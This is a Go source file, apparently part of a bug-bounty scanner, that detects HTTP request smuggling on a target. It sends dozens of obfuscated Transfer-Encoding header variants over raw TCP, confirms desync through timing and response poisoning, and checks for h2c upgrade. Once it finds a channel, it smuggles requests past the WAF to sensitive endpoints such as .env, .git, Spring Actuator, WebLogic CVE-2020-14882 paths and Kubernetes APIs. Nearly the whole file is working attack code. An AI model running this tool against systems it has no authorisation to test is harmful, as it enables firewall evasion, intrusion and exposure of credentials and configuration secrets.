package bugbounty

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

// HTTP Request Smuggling Detector + CVE Payload Carrier
// References:
//   - PortSwigger: https://portswigger.net/web-security/request-smuggling
//   - smuggler (Evan Custodio): 38 TE header permutations
//   - h2csmuggler: HTTP/2 upgrade downgrade smuggling
//   - hacktricks: https://github.com/carlospolop/hacktricks
//
// Detection layers:
//   1. Timing-based CL.TE / TE.CL (38 permutations)
//   2. Response confirmation (GPOST poisoning on keep-alive)
//   3. h2c upgrade smuggling (HTTP/2 downgrade)
//   4. CVE payload carrier through confirmed smuggling channel

type smugglePerm struct {
	Name    string
	TEKey   string
	TEValue string
}

// 38 TE header obfuscation permutations (from PortSwigger smuggler project)
var smugglePerms = []smugglePerm{
	{"spacejoin", "Transfer Encoding:", "chunked"},
	{"default", "Transfer-Encoding:", "chunked"},
	{"underjoin", "Transfer_Encoding:", "chunked"},
	{"space1", "Transfer-Encoding: ", "chunked"},
	{"space2", "Transfer-Encoding:", "chunked"},
	{"nameprefix1", " Transfer-Encoding:", "chunked"},
	{"valueprefix1", "Transfer-Encoding:  ", "chunked"},
	{"tabprefix1", "Transfer-Encoding:\t", "chunked"},
	{"vertprefix1", "Transfer-Encoding:\v", "chunked"},
	{"commaCow", "Transfer-Encoding: ", "chunked, identity"},
	{"cowComma", "Transfer-Encoding: ", "identity, chunked"},
	{"contentEnc", "Content-Encoding: ", "chunked"},
	{"linewrapped1", "Transfer-Encoding:\n ", "chunked"},
	{"gareth1", "Transfer-Encoding\n : ", "chunked"},
	{"quoted", "Transfer-Encoding: ", `"chunked"`},
	{"aposed", "Transfer-Encoding:", `'chunked'`},
	{"badwrap", "Foo: bar\r\n Transfer-Encoding: ", "chunked"},
	{"badsetupCR", "Fooz: bar\rTransfer-Encoding: ", "chunked"},
	{"badsetupLF", "Fooz: bar\nTransfer-Encoding: ", "chunked"},
	{"vertwrap", "Transfer-Encoding: \n\v", "chunked"},
	{"tabwrap", "Transfer-Encoding: \n\t", "chunked"},
	{"dualchunk", "Transfer-Encoding: ", "chunked\r\nTransfer-Encoding: identity"},
	{"lazygrep", "Transfer-Encoding: ", "chunk"},
	{"multiCase", "TrAnSFer-EnCODinG: ", "cHuNkeD"},
	{"UPPERCASE", "TRANSFER-ENCODING: ", "CHUNKED"},
	{"zdwrap", "Foo: bar\r\n\rTransfer-Encoding: ", "chunked"},
	{"zdsuffix1", "Transfer-Encoding: ", "chunked\r"},
	{"zdsuffix2", "Transfer-Encoding: ", "chunked\t"},
	{"revdualchunk", "Transfer-Encoding: ", "identity\r\nTransfer-Encoding: chunked"},
	{"bodysplit", "Foo: barn\n\nTransfer-Encoding: ", "chunked"},
	{"nested", "Transfer-Encoding: ", "cow chunked bar"},
	{"spaceFF", "Transfer-Encoding:", "\xFFchunked"},
	{"unispace", "Transfer-Encoding:", "\xA0chunked"},
	{"accentTE", "Transf\x82r-Encoding:", "chunked"},
	{"accentCH", "Transfr-Encoding: ", "ch\x96nked"},
}

// CVE probe paths to smuggle through the channel (bypassing WAF)
var smuggleCVEPaths = []struct {
	Path      string
	Indicator string
	Vuln      string
}{
	{"/actuator/gateway/routes", "id", "CVE-2022-22947 Spring Gateway"},
	{"/actuator/env", "propertySources", "Spring Actuator Env"},
	{"/console/login/LoginForm.jsp", "WebLogic", "WebLogic Console"},
	{"/console/css/%252e%252e%252fconsole.portal", "WebLogic", "CVE-2020-14882 WebLogic Bypass"},
	{"/.git/HEAD", "ref:", "Git Exposed"},
	{"/.env", "APP_", ".env Exposed"},
	{"/.svn/entries", "dir", "SVN Exposed"},
	{"/whoAmI/api/json", "anonymous", "Jenkins API"},
	{"/jolokia/list", "jolokia", "ActiveMQ Jolokia"},
	{"/nacos/v1/auth/users?pageNo=1&pageSize=9", "username", "Nacos Auth"},
	{"/api/v1/namespaces", "kubernetes", "K8s API"},
	{"/server-status", "Apache", "Apache Status"},
	{"/manager/html", "Tomcat Manager", "Tomcat Manager"},
	{"/solr/admin/cores", "solr", "Solr Admin"},
	{"/api/json", "jobs", "Jenkins API"},
}

func randHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func isTimeoutErr(err error) bool {
	if err == nil {
		return false
	}
	if ne, ok := err.(net.Error); ok && ne.Timeout() {
		return true
	}
	return strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline")
}

// testResult: 0=normal response, 1=timeout (smuggling!), 2=early disconnect
type testResult struct {
	Code    int
	Resp    string
	Elapsed time.Duration
}

func rawTCPTest(addr, payload string, timeout time.Duration) testResult {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return testResult{Code: -1}
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	start := time.Now()
	_, err = conn.Write([]byte(payload))
	if err != nil {
		return testResult{Code: -1, Elapsed: time.Since(start)}
	}
	buf := make([]byte, 16384)
	n, err := conn.Read(buf)
	elapsed := time.Since(start)
	if isTimeoutErr(err) {
		return testResult{Code: 1, Elapsed: elapsed}
	}
	if n == 0 {
		return testResult{Code: 2, Elapsed: elapsed}
	}
	return testResult{Code: 0, Resp: string(buf[:n]), Elapsed: elapsed}
}

func ProbeHTTPSmuggling(base string) *Finding {
	host := strings.TrimPrefix(strings.TrimPrefix(base, "http://"), "https://")
	host = strings.Split(host, "/")[0]
	port := "80"
	if strings.Contains(host, ":") {
		parts := strings.Split(host, ":")
		host = parts[0]
		port = parts[1]
	} else if strings.HasPrefix(base, "https://") {
		port = "443"
	}
	addr := net.JoinHostPort(host, port)

	// 1. Baseline timing with random cache buster
	cb := randHex(4)
	baseline := fmt.Sprintf("GET /?cb=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", cb, host)
	baseRes := rawTCPTest(addr, baseline, 5*time.Second)
	if baseRes.Code != 0 {
		return nil
	}

	// 2. Timing-based CL.TE and TE.CL detection (38 permutations)
	for _, p := range smugglePerms {
		// CL.TE: frontend reads CL, backend reads TE:chunked and hangs
		clte := fmt.Sprintf(
			"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\n%s%s\r\n\r\n0\r\n\r\nZ",
			cb, host, p.TEKey, p.TEValue)
		res := rawTCPTest(addr, clte, 12*time.Second)
		if res.Code == 1 && res.Elapsed >= 10*time.Second && baseRes.Elapsed < 2*time.Second {
			return smuggleCVEPayloads(base, addr, host, p, "CL.TE")
		}

		// TE.CL: frontend reads TE:chunked, backend reads CL=3
		tecl := fmt.Sprintf(
			"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 3\r\n%s%s\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
			cb, host, p.TEKey, p.TEValue)
		res = rawTCPTest(addr, tecl, 12*time.Second)
		if res.Code == 1 && res.Elapsed >= 10*time.Second && baseRes.Elapsed < 2*time.Second {
			return smuggleCVEPayloads(base, addr, host, p, "TE.CL")
		}
	}

	// 3. Response-based GPOST confirmation (keep-alive connection)
	for _, p := range smugglePerms {
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			continue
		}
		// CL.TE: smuggle "GPOST" as prefix to next request
		smuggle := fmt.Sprintf(
			"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\n%s%s\r\n\r\n5\r\nGPOST\r\n0\r\n\r\n",
			cb, host, p.TEKey, p.TEValue)
		conn.Write([]byte(smuggle))
		time.Sleep(300 * time.Millisecond)
		// Normal request - should get poisoned
		conn.Write([]byte(fmt.Sprintf("GET /?cb=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", randHex(4), host)))
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))

		buf1 := make([]byte, 16384)
		n1, _ := conn.Read(buf1)
		buf2 := make([]byte, 16384)
		n2, err2 := conn.Read(buf2)
		conn.Close()

		resp1 := string(buf1[:n1])
		resp2 := string(buf2[:n2])
		if err2 == nil && strings.Contains(resp2, "404") && !strings.Contains(resp1, "404") {
			return smuggleCVEPayloads(base, addr, host, p, "CL.TE-Confirmed")
		}
	}

	// 4. h2c smuggling detection (HTTP/2 upgrade downgrade)
	h2cPayload := fmt.Sprintf(
		"GET /?cb=%s HTTP/1.1\r\nHost: %s\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nConnection: Upgrade, HTTP2-Settings\r\n\r\n",
		cb, host)
	h2cRes := rawTCPTest(addr, h2cPayload, 8*time.Second)
	if h2cRes.Code == 0 && strings.Contains(h2cRes.Resp, "101") {
		// h2c upgrade accepted - can smuggle HTTP/2 -> HTTP/1.1
		return &Finding{
			Target:   base,
			Vuln:     "HTTP/2 h2c Upgrade Smuggling",
			Severity: "HIGH",
			Detail:   "h2c upgrade accepted, HTTP/2 downgrade possible",
			URL:      base,
		}
	}

	return nil
}

// smuggleCVEPayloads: after smuggling confirmed, carry CVE probes through channel
func smuggleCVEPayloads(base, addr, host string, p smugglePerm, method string) *Finding {
	for _, cve := range smuggleCVEPaths {
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			continue
		}
		// Build smuggled request: full HTTP GET to CVE path
		smuggledReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", cve.Path, host)
		chunkSize := len(smuggledReq)
		// CL.TE: wrap smuggled request as chunked body
		smugglePayload := fmt.Sprintf(
			"POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n%s%s\r\n\r\n%x\r\n%s0\r\n\r\n",
			host, chunkSize, p.TEKey, p.TEValue, chunkSize, smuggledReq)
		conn.Write([]byte(smugglePayload))
		time.Sleep(500 * time.Millisecond)
		// Normal request to flush
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(8 * time.Second))

		// Read 3 responses: POST, smuggled CVE, normal GET
		buf1 := make([]byte, 16384)
		conn.Read(buf1)
		buf2 := make([]byte, 16384)
		n2, err2 := conn.Read(buf2)
		conn.Close()

		if err2 == nil {
			resp2 := string(buf2[:n2])
			if strings.Contains(resp2, cve.Indicator) && !strings.Contains(resp2, "404") {
				return &Finding{
					Target:   base,
					Vuln:     fmt.Sprintf("HTTP Smuggling %s + %s", method, cve.Vuln),
					Severity: "CRITICAL",
					Detail:   fmt.Sprintf("smuggled GET %s -> %s (WAF bypass)", cve.Path, cve.Indicator),
					URL:      base + cve.Path,
				}
			}
		}
	}
	return &Finding{
		Target:   base,
		Vuln:     fmt.Sprintf("HTTP Smuggling %s (%s)", method, p.Name),
		Severity: "HIGH",
		Detail:   "smuggling confirmed, CVE probes sent through channel",
		URL:      base,
	}
}
